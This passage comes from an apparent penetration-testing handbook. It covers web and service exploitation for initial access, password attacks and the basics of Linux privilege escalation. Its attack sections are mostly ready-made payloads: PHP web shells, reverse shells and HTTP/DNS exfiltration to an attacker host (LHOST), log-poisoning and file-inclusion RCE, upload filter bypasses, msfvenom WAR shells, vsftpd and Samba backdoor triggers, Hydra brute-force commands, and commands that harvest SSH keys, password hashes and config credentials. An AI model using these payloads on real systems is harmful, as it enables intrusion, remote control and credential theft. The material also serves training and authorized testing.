# POST request SQLi:
sqlmap -u "http://TARGET_IP/login" --data="username=admin&password=test" --dbs

# With cookie:
sqlmap -u "http://TARGET_IP/profile" --cookie="session=abc123" --dbs

# SQLi to OS command execution (if MySQL + FILE privilege):
sqlmap -u "http://TARGET_IP/page?id=1" --os-shell     # Interactive OS shell!
sqlmap -u "http://TARGET_IP/page?id=1" --file-write /tmp/shell.php --file-dest /var/www/html/shell.php

# Manual SQLi for file write (UNION based):
# If SQLi confirmed, try writing web shell:
' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 INTO OUTFILE '/var/www/html/shell.php'-- -
# Then: http://TARGET_IP/shell.php?cmd=id

# LOAD_FILE to read files:
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),2,3-- -
```

### 0b.3.2 Local File Inclusion (LFI) to Shell

LFI occurs when a script includes a file using user-controlled input without proper validation.

```bash
# Detect LFI:
# Look for URL parameters like: ?page=home, ?file=index, ?include=content
# Try: ?page=../../../../etc/passwd
# Or: ?file=../../../etc/passwd
# Or: ?include=....//....//....//etc/passwd  (double encode)

# Basic LFI test:
curl "http://TARGET_IP/page?file=../../../../etc/passwd"
curl "http://TARGET_IP/index.php?page=../../../etc/shadow"

# If /etc/passwd is returned → LFI confirmed!

# LFI path traversal variants:
# ../ (standard)
# ....// (double dot with double slash)
# ..%2F (URL encoded slash)
# %2e%2e%2f (fully URL encoded)
# ..%252F (double URL encoded)
# ..%c0%af (Unicode encoded slash)

# What to read with LFI:
/etc/passwd              # User accounts
/etc/shadow              # Password hashes (if readable)
/etc/hosts               # Network configuration
/etc/crontab             # Cron jobs
/proc/version            # Kernel version
/proc/self/environ       # Process environment (may contain HTTP headers!)
/proc/self/cmdline       # Current process command line
/var/log/auth.log        # Authentication logs
/var/log/apache2/access.log   # Apache access log
/var/log/apache2/error.log    # Apache errors
/var/log/nginx/access.log     # Nginx access log
/home/USER/.bash_history      # Bash history
/home/USER/.ssh/id_rsa        # SSH private keys!
/var/www/html/config.php      # Web app config
/var/www/html/wp-config.php   # WordPress database credentials

# LFI to RCE via Log Poisoning:
# Step 1: Find an accessible log file via LFI
curl "http://TARGET_IP/?page=../../../../var/log/apache2/access.log"
# If you can read the log → log poisoning possible!

# Step 2: Inject PHP code into the log via User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET_IP/
# This writes PHP code INTO the access log!

# Step 3: Include the log via LFI (it now contains your PHP code):
curl "http://TARGET_IP/?page=../../../../var/log/apache2/access.log&cmd=id"
# The PHP in the log executes → RCE!

# Other log files for poisoning:
/var/log/nginx/access.log          # Nginx (inject via User-Agent)
/var/log/vsftpd.log                # FTP log (inject via FTP username)
/var/log/sshd.log or auth.log      # SSH log (inject via SSH username)
/var/mail/www-data                 # Mail spool

# LFI via PHP wrappers (no file needed — RCE directly!):
# php://filter — read PHP source code (base64 encoded):
curl "http://TARGET_IP/?page=php://filter/convert.base64-encode/resource=config.php"
# Decode: echo "BASE64" | base64 -d

# php://input — POST data executed as PHP:
curl -X POST "http://TARGET_IP/?page=php://input" \
     -d '<?php system("bash -i >& /dev/tcp/LHOST/LPORT 0>&1"); ?>'

# data:// wrapper (execute inline PHP):
curl "http://TARGET_IP/?page=data://text/plain,<?php%20system('id');?>"
curl "http://TARGET_IP/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+"

# expect:// wrapper (command execution):
curl "http://TARGET_IP/?page=expect://id"

# LFI to /proc/self/environ — inject through HTTP headers:
# Step 1: Check if /proc/self/environ is accessible:
curl "http://TARGET_IP/?page=../../../../proc/self/environ"
# If you see HTTP_USER_AGENT or other headers → exploit!

# Step 2: Inject PHP into User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" \
     "http://TARGET_IP/?page=../../../../proc/self/environ&cmd=id"
```

### 0b.3.3 Remote File Inclusion (RFI)

```bash
# RFI: the application includes a REMOTE URL — you can serve your own PHP file!
# Test: ?page=http://LHOST/test.php
# If you see content from your server → RFI!

# Setup: host malicious PHP on attacker:
echo '<?php system($_GET["cmd"]); ?>' > /tmp/cmd.php
python3 -m http.server 80

# Exploit:
curl "http://TARGET_IP/?page=http://LHOST/cmd.php&cmd=id"

# RFI to reverse shell:
# Create reverse shell PHP:
cat > /tmp/shell.php << 'EOF'
<?php
$sock=fsockopen("LHOST",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
EOF
python3 -m http.server 80
nc -lvnp 4444

# Trigger:
curl "http://TARGET_IP/?page=http://LHOST/shell.php"
```

### 0b.3.4 Command Injection

```bash
# Command injection: user input is passed directly to system/exec/shell_exec

# Detection: try adding ; or | or && or ` after normal input
# Example field: "Enter IP to ping: [_________]"
# Try: 127.0.0.1; id
# If output shows current user → command injection!

# Inject variants (bypass filters):
; id                   # Semicolon — run after previous command
| id                   # Pipe — connect to id
|| id                  # OR — run if previous fails
&& id                  # AND — run if previous succeeds
`id`                   # Backtick — command substitution
$(id)                  # Dollar-paren — command substitution

# URL-encoded versions for GET params:
;id         → %3Bid
|id         → %7Cid
&id         → %26id
$(id)       → %24%28id%29

# Blind command injection (no output shown):
# Use time delays to confirm:
; sleep 5              # If response takes 5 extra seconds → confirmed!
; ping -c 5 LHOST      # Check your tcpdump for ICMP packets

# Exfil data via DNS (blind injection confirmation):
; nslookup `whoami`.LHOST_BURPCOLLABORATOR

# Blind injection to reverse shell:
; bash -i >& /dev/tcp/LHOST/LPORT 0>&1
; curl http://LHOST/$(cat /etc/passwd | base64)   # Exfil via HTTP

# Filter bypass:
# If spaces filtered:
;{IFS}id
;cat${IFS}/etc/passwd
# If & or | filtered — try backticks
# If > filtered — use tee: id|tee /tmp/out
```

### 0b.3.5 File Upload Vulnerabilities

```bash
# A file upload that allows PHP files = direct shell!

# Step 1: Identify upload functionality
# Look for: profile pictures, document uploads, import features, avatar uploads

# Step 2: Try uploading a PHP shell directly:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# If it allows .php → instant win, access at uploaded location

# Step 3: If .php is blocked, try bypass techniques:

# A) Change extension:
shell.php3    # Older PHP
shell.php4
shell.php5
shell.phtml
shell.pht
shell.php.jpg   # Double extension — some servers execute!
shell.PHP       # Uppercase bypass
shell.Php
shell.phP

# B) MIME type bypass — change Content-Type header:
# Upload .php file but change Content-Type to image/jpeg
curl -F "file=@shell.php;type=image/jpeg" http://TARGET_IP/upload

# C) Add magic bytes (make PHP look like image):
# JPEG magic bytes: FF D8 FF E0
printf '\xff\xd8\xff\xe0' > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg
# Some validators only check magic bytes, not extension

# D) Null byte injection (older PHP):
shell.php%00.jpg   # PHP sees shell.php, file system sees .jpg

# E) Double extension:
shell.jpg.php    # If server processes last extension
shell.php.jpg    # If server allows jpg but executes based on content

# F) .htaccess upload (if Apache and /uploads/.htaccess writable):
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# Now upload shell.jpg — it executes as PHP!

# Step 4: Find where the file was uploaded:
# Common upload directories:
/uploads/
/upload/
/files/
/images/
/media/
/static/
/assets/uploads/
/wp-content/uploads/   # WordPress

# Step 5: Access your shell:
curl "http://TARGET_IP/uploads/shell.php?cmd=id"

# Step 6: Upgrade to reverse shell:
curl "http://TARGET_IP/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261'"
```

### 0b.3.6 Default Credentials

One of the most overlooked but most effective initial access methods:

```bash
# Always try default credentials FIRST — before complex exploitation!

# Common default credential pairs:
admin:admin
admin:password
admin:Password1
admin:123456
admin:admin123
admin:(blank)
root:root
root:password
root:toor          # Root backwards!
administrator:administrator
administrator:password
user:user
guest:guest
test:test

# Service-specific defaults:
# SSH: root:root, root:password, admin:admin
# MySQL: root:(blank), root:root, root:mysql
# PostgreSQL: postgres:postgres, postgres:(blank)
# Redis: (no auth by default!)
# MongoDB: (no auth by default!)
# Tomcat: tomcat:tomcat, admin:admin, manager:manager
# Jenkins: admin:admin, admin:(blank — check initial password!)
# phpMyAdmin: root:(blank), root:root
# DVWA: admin:password, gordonb:abc123, 1337:charley
# Webmin: admin:admin
# Grafana: admin:admin
# Portainer: admin:admin
# Default router panels: admin:admin, admin:password, admin:1234

# Credential stuffing with Hydra (automated):
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
      http-post-form "TARGET_IP/login:username=^USER^&password=^PASS^:Invalid credentials" \
      -t 10 -V

# Check if Tomcat manager is accessible:
curl -u admin:admin http://TARGET_IP:8080/manager/html
curl -u tomcat:tomcat http://TARGET_IP:8080/manager/html

# If Tomcat manager accessible → deploy WAR file with shell!
msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war -o shell.war
# Upload via manager UI or:
curl -u admin:admin -T shell.war http://TARGET_IP:8080/manager/deploy?path=/shell&update=true
nc -lvnp LPORT
curl http://TARGET_IP:8080/shell/
```

---

# Chapter 0c: Service Exploitation for Initial Access

## 0c.1 FTP Exploitation

```bash
# Anonymous FTP — check first, always:
ftp TARGET_IP
# Name: anonymous
# Password: anonymous (or just press Enter)
# If login succeeds:
ftp> ls -la       # List all files including hidden
ftp> pwd          # Current directory
ftp> cd ..        # Try to navigate up
ftp> get secret.txt  # Download file
ftp> put shell.php   # If writable — upload shell!
ftp> mget *       # Download all files
ftp> bye          # Exit

# Checking FTP for writable directories:
ftp> put test.txt          # Try uploading
# If upload succeeds → web root may be writable!
# If FTP is in web root — upload PHP shell and access via HTTP!

# FTP with found credentials:
ftp TARGET_IP
# Use discovered username/password

# Vulnerable FTP versions:
# vsftpd 2.3.4 (CVE-2011-2523) — backdoor triggered by :) in username:
nc TARGET_IP 21
# Type:
USER happy:)
PASS anything
# Now connect to backdoor port:
nc TARGET_IP 6200
# → Shell as root!

# ProFTPD 1.3.5 (CVE-2015-3306) — mod_copy arbitrary file copy:
# Copy /etc/passwd to web root:
nc TARGET_IP 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
curl http://TARGET_IP/passwd.txt   # Read it!

# Copy SSH key:
SITE CPFR /root/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa
```

## 0c.2 SMB / Samba Exploitation

```bash
# Enumerate SMB shares:
smbclient -L //TARGET_IP -N                    # No password
smbclient -L //TARGET_IP -U guest -p ''       # Guest account

# List with crackmapexec:
crackmapexec smb TARGET_IP
crackmapexec smb TARGET_IP --shares -u '' -p ''
crackmapexec smb TARGET_IP --shares -u 'guest' -p ''

# Connect to share:
smbclient //TARGET_IP/SHARENAME -N             # No auth
smbclient //TARGET_IP/SHARENAME -U alice%password  # With creds
smb> ls            # List files
smb> get file.txt  # Download
smb> put shell.php # Upload (if writable)
smb> cd directory  # Navigate

# Mount SMB share:
sudo mount -t cifs //TARGET_IP/SHARENAME /mnt/smb -o username=guest,password=''
ls /mnt/smb/

# EternalBlue (MS17-010) — SMB RCE, works on unpatched Windows (less relevant for Linux but important to know):
nmap --script=smb-vuln-ms17-010 TARGET_IP
# Use Metasploit: exploit/windows/smb/ms17_010_eternalblue

# Samba RCE vulnerabilities:
# Check version: smbclient -L TARGET_IP -N
# Samba 3.5.0-4.4.14/4.5.10/4.6.4 → SambaCry (CVE-2017-7494):
# File write to writable share → execute shared library
# https://github.com/opsxcq/exploit-CVE-2017-7494

# username map script (CVE-2007-2447) — Samba 3.0.0-3.0.25rc3:
# Inject through username:
smbclient //TARGET_IP/tmp -U './=`nohup nc -lvnp 4444 -e /bin/sh`'
```

## 0c.3 SMTP User Enumeration

```bash
# SMTP VRFY / EXPN commands reveal valid usernames
# This is useful for building a username list for SSH brute force

# Manual:
nc TARGET_IP 25
EHLO test
VRFY root           # Returns 252 if exists, 550 if not
VRFY admin
VRFY www-data
EXPN root           # Expand (may reveal aliases/group members)

# Automated with smtp-user-enum:
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t TARGET_IP
smtp-user-enum -M EXPN -U usernames.txt -t TARGET_IP
smtp-user-enum -M RCPT -U usernames.txt -t TARGET_IP -D TARGET_DOMAIN

# Once you have valid usernames → try SSH brute force with those names
```

## 0c.4 SNMP Information Disclosure

```bash
# SNMP can reveal an enormous amount of information about a system
# Default community strings: public, private, manager

# Check with onesixtyone:
onesixtyone TARGET_IP public
onesixtyone TARGET_IP private
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt TARGET_IP

# If community string found — walk the MIB tree:
snmpwalk -c public -v1 TARGET_IP
snmpwalk -c public -v2c TARGET_IP

# Extract specific info:
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.25.4.2.1.2   # Running processes
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.25.6.3.1.2   # Installed software
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.25.1.6.0     # System users
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.4.1.77.1.2.25    # User accounts!
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.6.13.1.3     # Open TCP ports!
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.25.1.4       # Login processes

# Use snmp-check for formatted output:
snmp-check TARGET_IP -c public
# This formats SNMP data beautifully: users, services, processes, network interfaces
```

---

# Chapter 0d: Credential Attacks & Password Spraying

## 0d.1 Password Spraying Theory

Password spraying is the opposite of traditional brute force:
- **Traditional brute force:** One username, many passwords → risk of account lockout
- **Password spraying:** Many usernames, one (or few) passwords → avoids lockout

```
Why spraying works: Organizations often enforce complexity requirements
("must have uppercase, number, special char") but employees just use:
Password1!, Summer2024!, Company2024!, Welcome1!
```

## 0d.2 Building Wordlists

```bash
# Common wordlists:
/usr/share/wordlists/rockyou.txt           # 14 million passwords (gold standard)
/usr/share/wordlists/seclists/             # Comprehensive collection
/usr/share/wordlists/dirbuster/            # Directory lists

# Generate custom wordlist with CeWL (words from target website):
cewl http://TARGET_IP -d 2 -m 5 -w wordlist.txt
# -d = crawl depth, -m = minimum word length

# Generate mutations with hashcat rules:
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt

# John the Ripper wordlist rules:
john --wordlist=wordlist.txt --rules --stdout > mutated.txt

# Username wordlists:
/usr/share/wordlists/seclists/Usernames/Names/names.txt
/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
```

## 0d.3 Hydra — Complete Reference

```bash
# ============================================================
# HYDRA SYNTAX: hydra -L users -P passwords TARGET SERVICE
# ============================================================

# SSH brute force:
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
hydra -L users.txt -P passwords.txt ssh://TARGET_IP -t 4 -V
hydra -l admin -P rockyou.txt TARGET_IP ssh -V -f
# -f = stop after first success
# -V = show each attempt
# -t = threads (4 for SSH — more causes failures)

# FTP brute force:
hydra -l admin -P rockyou.txt ftp://TARGET_IP
hydra -L users.txt -P passes.txt ftp://TARGET_IP -t 10

# HTTP form brute force (POST):
hydra -l admin -P rockyou.txt TARGET_IP http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid password"
# Format: "PATH:POST_DATA:FAILURE_STRING"
# ^USER^ and ^PASS^ are placeholders

# HTTP form (GET):
hydra -l admin -P rockyou.txt TARGET_IP http-get-form \
    "/login?user=^USER^&pass=^PASS^:Login failed"

# HTTP Basic Auth:
hydra -l admin -P rockyou.txt http-get://TARGET_IP/protected

# HTTPS:
hydra -l admin -P rockyou.txt https-post-form \
    "TARGET_IP/login:user=^USER^&pass=^PASS^:wrong"

# MySQL:
hydra -l root -P rockyou.txt mysql://TARGET_IP

# SMB:
hydra -L users.txt -P passwords.txt smb://TARGET_IP

# RDP:
hydra -l administrator -P rockyou.txt rdp://TARGET_IP -t 4

# Custom port:
hydra -l admin -P rockyou.txt -s 2222 ssh://TARGET_IP
```

## 0d.4 What To Do When You Have Credentials

```bash
# When you find credentials (from any source), immediately try them on:

# 1. SSH:
ssh username@TARGET_IP
ssh root@TARGET_IP -i found_key.pem    # If it's a key

# 2. FTP:
ftp TARGET_IP    # Then enter creds

# 3. Web application login

# 4. Database:
mysql -h TARGET_IP -u username -p

# 5. Other users on same system (credential reuse!):
su another_user    # Switch to another user
su root            # Try becoming root directly

# 6. Sudo with found password:
sudo -l            # First check what you can do
sudo bash          # If allowed

# Credential sources to check on the system once you have a shell:
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
find / -name "*.env" 2>/dev/null | xargs cat 2>/dev/null
find / -name "wp-config.php" 2>/dev/null | xargs cat 2>/dev/null
find / -name "config.php" 2>/dev/null | xargs cat 2>/dev/null
cat ~/.bash_history | grep -i "pass\|mysql\|ssh\|ftp"
cat /root/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null

# Database credentials often lead to system credentials (password reuse):
# Found: DB_PASSWORD=SuperSecret99 → try: ssh user@TARGET with SuperSecret99
```

---

---

# PART I — FOUNDATIONS

---

# Chapter 1: Understanding the Linux Privilege Model

## 1.1 The Linux User & Permission Model

Linux is a multi-user operating system built around a strict permission hierarchy. Understanding this model is the **foundation** of privilege escalation — you cannot exploit what you don't understand.

### 1.1.1 Users and UIDs

Every process in Linux runs under a **User ID (UID)**. The kernel uses UIDs to enforce access control, not usernames — usernames are just human-readable labels.

```
UID 0     → root (superuser) — the god account
UID 1-999 → system/service accounts (daemon, www-data, mysql, etc.)
UID 1000+ → regular user accounts
```

To see your current identity:

```bash
# Who am I?
whoami          # prints username
id              # prints UID, GID, and group memberships
id -u           # just the UID number
id -G           # all group IDs
id -Gn          # all group names

# Example output of `id`:
# uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),27(sudo),1001(docker)
```

**What to look for:** Any interesting group memberships beyond your primary group. Groups like `sudo`, `docker`, `disk`, `lxd`, `adm`, `staff` all have special privileges worth exploiting.

### 1.1.2 The Root Account

UID 0 is root. It bypasses virtually **all** permission checks in the kernel. A process running as root can:
- Read/write any file
- Kill any process
- Bind to any port (including privileged ports < 1024)
- Load/unload kernel modules
- Change file ownership to anyone
- Modify system configuration

### 1.1.3 Effective UID (EUID), Real UID (RUID), Saved UID (SUID)

This is critical for understanding SUID exploitation:

| Type | Meaning |
|------|---------|
| **RUID** | Real User ID — who actually started the process |
| **EUID** | Effective User ID — what permissions the process uses right now |
| **SUID** | Saved UID — used when temporarily dropping/restoring privileges |

When a SUID binary runs, the EUID becomes the **file owner's** UID (often root), even if the RUID is an unprivileged user. This is the entire basis of SUID exploitation.

```bash
# Check your real and effective IDs
cat /proc/$$/status | grep -E "^[RES].*[Uu]id"
```

### 1.1.4 File Permission Bits

Every file has three sets of permissions for three categories:

```
Permission String: -rwxr-xr--
                   │├──┤├──┤├──┤
                   │ │  │  │
                   │ │  │  └── Others (everyone else): r-- = read only
                   │ │  └───── Group: r-x = read + execute
                   │ └──────── Owner: rwx = read + write + execute
                   └────────── File type (- = regular, d = dir, l = link)
```

**Octal notation:**

```
r = 4
w = 2
x = 1

rwx = 7    (4+2+1)
rw- = 6    (4+2)
r-x = 5    (4+1)
r-- = 4    (4)
--- = 0
```

So `chmod 755` = `rwxr-xr-x` (owner: full, group: read+exec, others: read+exec)

### 1.1.5 Special Permission Bits

These are the **gold mine** for privilege escalation:

| Bit | Octal | On File | On Directory |
|-----|-------|---------|--------------|
| **SUID** | 4000 | Execute as file owner | No effect (mostly) |
| **SGID** | 2000 | Execute as file group | New files inherit group |
| **Sticky** | 1000 | No effect | Only owner can delete files |

```bash
# SUID file looks like:
-rwsr-xr-x 1 root root 12345 Jan 1 00:00 /usr/bin/passwd
#    ^--- 's' in owner execute position = SUID set

# SGID file:
-rwxr-sr-x 1 root shadow 12345 Jan 1 00:00 /usr/bin/chage
#       ^--- 's' in group execute position = SGID set
```

## 1.2 How Privilege Escalation Works

Privilege escalation (privesc) is the act of gaining more access than you were initially granted. In Linux, this almost always means going from a low-privilege user to root (UID 0).

### 1.2.1 The Privilege Escalation Mental Model

```
[Initial Access] → [Local Enumeration] → [Identify Vector] → [Exploit] → [Root]
```

**Common vectors:**
1. Misconfigured SUID/SGID binaries
2. Sudo misconfigurations
3. Weak file permissions (writable /etc/passwd, cron jobs, etc.)
4. Kernel vulnerabilities
5. Credentials in files
6. Writable scripts run as root
7. Path hijacking
8. Library injection
9. Container escapes
10. Service exploitation

### 1.2.2 The Attacker's Mindset

When you land on a box, ask yourself:

```
1. What can I READ that I shouldn't be able to?
2. What can I WRITE that I shouldn't be able to?
3. What can I EXECUTE as someone else?
4. What SERVICES are running as root?
5. What SCHEDULED TASKS run as root?
6. Are there CREDENTIALS anywhere?
7. Is the KERNEL outdated?
```

Every answer leads to a potential escalation path.

## 1.3 Linux Authentication Files

### 1.3.1 /etc/passwd

```bash
cat /etc/passwd
```

Format: `username:password:UID:GID:GECOS:home:shell`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
alice:x:1000:1000:Alice Smith,,,:/home/alice:/bin/bash
```

Fields explained:
- `username` — login name
- `password` — `x` means password is in /etc/shadow; if it's an actual hash, it's directly crackable
- `UID` — user ID
- `GID` — primary group ID
- `GECOS` — comment/description
- `home` — home directory
- `shell` — login shell (`/usr/sbin/nologin` or `/bin/false` = no login)

**What to look for:**
- UIDs of 0 other than root (backdoor accounts)
- Writable /etc/passwd (you can add a root user!)
- Hashes directly in the password field (older systems)
- Shells for service accounts (shouldn't have /bin/bash)

### 1.3.2 /etc/shadow

```bash
cat /etc/shadow   # requires root or shadow group
```

Format: `username:hash:lastchange:min:max:warn:inactive:expire`

```
root:$6$rounds=5000$salt$hashhashhashhash...:18000:0:99999:7:::
alice:$6$rounds=5000$randomsalt$longhashvalue:18500:0:99999:7:::
```

Hash prefixes:
- `$1$` — MD5 (very weak, easily cracked)
- `$2a$` — bcrypt
- `$5$` — SHA-256
- `$6$` — SHA-512 (most common modern Linux)
- `!` or `*` — account locked (no password login)
- Empty field — no password (login without password!)

### 1.3.3 /etc/group

```bash
cat /etc/group
```

Format: `groupname:password:GID:members`

```bash
sudo:x:27:alice,bob
docker:x:998:alice
adm:x:4:syslog,alice
```

**What to look for:** What high-value groups does your user belong to?

---

# Chapter 2: Enumeration — The Art of Reconnaissance

## 2.1 Why Enumeration is Everything

> **"Enumeration is 90% of privilege escalation. The exploit is just 10%."**

Missing one misconfigured SUID binary or one world-writable cron script is the difference between staying stuck and becoming root. Thorough enumeration is non-negotiable.

## 2.2 System Information Gathering

### 2.2.1 OS & Kernel Information

```bash
# Operating system info
cat /etc/os-release          # Distro name, version, ID
cat /etc/issue               # Login banner — often shows distro
cat /etc/*release            # All release files
cat /etc/debian_version      # If Debian-based
cat /etc/redhat-release      # If Red Hat-based

# Kernel version — CRITICAL for kernel exploit research
uname -a                     # Full kernel info
uname -r                     # Just kernel release (e.g., 4.4.0-116-generic)
uname -m                     # Machine hardware (x86_64, i686, etc.)

# Full system info
hostnamectl                  # Hostname, OS, kernel (systemd systems)
lsb_release -a               # LSB info

# CPU architecture (important for exploit compilation)
arch
file /bin/bash               # Shows 32 or 64-bit ELF
```

**Example output and what it tells you:**

```
Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
                ↑
         Kernel 4.4.0-116 → Search "4.4.0-116 privilege escalation"
         → Dirty COW (CVE-2016-5195) affects kernels < 4.8.3!
```

### 2.2.2 Environment Variables

```bash
# All environment variables
env
printenv
set          # bash built-in: shows env + shell variables + functions

# Specific variables
echo $PATH
echo $HOME
echo $USER
echo $SHELL
echo $TERM
echo $LANG
echo $LD_PRELOAD
echo $LD_LIBRARY_PATH
echo $PYTHONPATH
echo $RUBYLIB
echo $PERL5LIB

# Process environment (if /proc readable)
cat /proc/$$/environ | tr '\0' '\n'   # Your own process env
cat /proc/1/environ | tr '\0' '\n'    # Init process env (often readable)
```

**What to look for:** Sensitive credentials, unusual PATH entries, preload paths that could be hijacked.

### 2.2.3 Network Configuration

```bash
# Network interfaces
ifconfig -a              # Classic (if installed)
ip a                     # Modern equivalent
ip addr show

# Routing table
route -n                 # Classic
ip route                 # Modern
ip route show

# ARP table (other hosts on the network)
arp -a
ip neigh

# Open ports and listening services — CRITICAL
netstat -tulpn           # TCP+UDP, listening, show PID/program, numeric
netstat -antup           # All, numeric, show TCP/UDP with PID
ss -tulpn                # Modern netstat equivalent (faster)
ss -lntp                 # Listening TCP with process
ss -lnup                 # Listening UDP with process

# Active connections
netstat -antp
ss -antp

# DNS config
cat /etc/resolv.conf
cat /etc/hosts           # Local hostname resolution — look for internal hosts!

# Firewall rules
iptables -L -n -v        # May need root
iptables-save
cat /etc/iptables/rules.v4
```

**What to look for:**
- Services listening on localhost (127.0.0.1) that aren't exposed externally — these may be vulnerable internal services
- Internal IPs suggesting a network you can pivot into
- `/etc/hosts` entries revealing internal hostnames

### 2.2.4 Running Processes

```bash
# All running processes
ps aux                   # BSD syntax: all users, user/terminal, extended
ps -ef                   # System V syntax: every process, full format
ps -eo user,pid,ppid,cmd # Custom format: user, PID, parent PID, command

# Process tree (visual hierarchy)
pstree -a                # ASCII tree with arguments
pstree -aup              # With users and PIDs

# Watch processes in real time (catch short-lived processes!)
watch -n 0.1 'ps aux'           # Refresh every 0.1 seconds
watch -n 0.1 'ps aux --sort=-%cpu | head -20'

# More elegant process watching with pspy (upload this tool!)
./pspy64                 # Monitors without root — catches cron jobs!
./pspy32                 # 32-bit version
```

**Why pspy is gold:** Cron jobs and scripts run by root often execute for only a second. `ps aux` won't catch them. `pspy` watches `/proc` for new processes without needing root and logs everything — it's essential for catching root cron jobs.

### 2.2.5 Installed Software & Services

```bash
# Package managers
dpkg -l                  # Debian/Ubuntu: all installed packages
rpm -qa                  # Red Hat/CentOS: all installed packages
apt list --installed     # Modern Debian
yum list installed       # CentOS/RHEL

# Running services
systemctl list-units --type=service --state=running
service --status-all     # Older SysV init systems
chkconfig --list         # Red Hat SysV services

# Find version of specific programs
mysql --version
python --version; python3 --version
php --version
ruby --version
perl --version
gcc --version
openssl version

# Find binaries in common locations
ls -la /usr/bin/ /usr/sbin/ /bin/ /sbin/
```

## 2.3 User & Group Enumeration

```bash
# All users on the system
cat /etc/passwd
cat /etc/passwd | cut -d: -f1          # Just usernames
cat /etc/passwd | grep -v nologin      # Users with valid shells
cat /etc/passwd | grep -v false        # Users with valid shells
getent passwd                          # Same as /etc/passwd via NSS

# All groups
cat /etc/group
getent group

# Current user info
id
whoami
groups                                  # Groups current user belongs to

# Sudo privileges for current user
sudo -l                                 # LIST what you can run as sudo
sudo -ll                                # Verbose list

# Last logins
last                                    # Who logged in recently
lastlog                                 # Last login for all users
lastlog | grep -v "Never"              # Only users who have logged in
w                                       # Who is currently logged in + what they're doing
who                                     # Currently logged in users

# History files — GOLD MINE for credentials
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.sh_history
cat ~/.mysql_history
cat ~/.python_history
cat ~/.nano_history
history                                  # Current session history

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa                        # Private key!
cat ~/.ssh/authorized_keys               # Who can SSH in
cat ~/.ssh/known_hosts                   # Systems this user has connected to
```

## 2.4 File System Enumeration

### 2.4.1 SUID/SGID Files

```bash
# Find ALL SUID files (owned by root, SUID bit set)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null    # Same thing

# Find ALL SGID files
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find SUID AND SGID files together
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# Find SUID files, show permissions and owner
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Cleaner output with stat
find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null
```

**Explaining the `find` command completely:**

```
find [path] [options] [tests] [actions]

find /         → search starting from filesystem root
-perm -4000    → files with SUID bit set (-4000 means "at least these bits")
-perm /4000    → same as -4000 in newer find versions
-perm 4755     → EXACT permission match (less useful for searching)
-type f        → only regular files (not directories/links)
-type d        → only directories
-type l        → only symbolic links
2>/dev/null    → redirect errors (permission denied) to /dev/null

Actions:
-exec ls -la {} \;    → run ls -la on each found file (sequential)
-exec ls -la {} +     → run ls -la on all found files at once (faster)
| xargs ls -la        → pipe to xargs for same effect

More useful find flags:
-name "*.conf"        → find by name pattern
-iname "*.conf"       → case-insensitive name
-user root            → owned by root
-group shadow         → owned by shadow group
-writable             → writable by current user
-mtime -7             → modified in last 7 days
-mmin -60             → modified in last 60 minutes
-size +10M            → larger than 10 MB
-newer /etc/passwd    → newer than /etc/passwd
-maxdepth 3           → only search 3 directory levels deep
-ls                   → detailed listing (like ls -dils)
```

### 2.4.2 World-Writable Files & Directories

```bash
# World-writable files (anyone can write)
find / -writable -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null   # Others writable
find / -perm -2 -type f 2>/dev/null     # Octal: others write bit

# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

# World-writable files NOT in /proc or /sys (exclude noise)
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Writable files owned by root (especially interesting)
find / -user root -writable -type f 2>/dev/null | grep -v proc

# Writable /etc files (config files writable by your user)
find /etc -writable -type f 2>/dev/null
```

### 2.4.3 Interesting File Discovery

```bash
# Configuration files
find / -name "*.conf" -type f 2>/dev/null
find / -name "*.config" -type f 2>/dev/null
find / -name "*.cfg" -type f 2>/dev/null
find / -name "*.ini" -type f 2>/dev/null

# Credential files
find / -name "*.txt" -type f 2>/dev/null | head -50
